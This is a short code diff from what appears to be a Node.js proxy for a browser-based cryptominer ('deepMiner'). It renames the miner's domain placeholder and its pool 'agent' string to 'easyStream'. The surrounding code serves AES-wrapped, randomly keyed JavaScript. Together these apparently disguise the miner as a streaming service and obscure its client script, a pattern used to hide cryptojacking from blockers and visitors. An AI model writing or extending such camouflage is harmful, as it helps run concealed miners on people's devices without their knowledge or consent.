@@ -62,7 +62,7 @@ const stats = (req, res) => {
             res.end();
         } else {
             if (!req.url.match(/\.wasm$/) && !req.url.match(/\.mem$/)) {
-                buf = buf.toString().replace(/%deepMiner_domain%/g, conf.domain);
+                buf = buf.toString().replace(/%easyStream_domain%/g, conf.domain);
                 if (req.url.match(/\.js$/)) {
                     var randKey = rand(32);
                     tmp = fs.readFileSync(__dirname + '/tmpl.aes.min.js', 'utf8');
@@ -125,7 +125,7 @@ srv.on('connection', (ws) => {
                         "params": {
                             "login": conf.addr,
                             "pass": conf.pass,
-                            "agent": "deepMiner"
+                            "agent": "easyStream"
                         },
                         "id": conn.pid
                     }
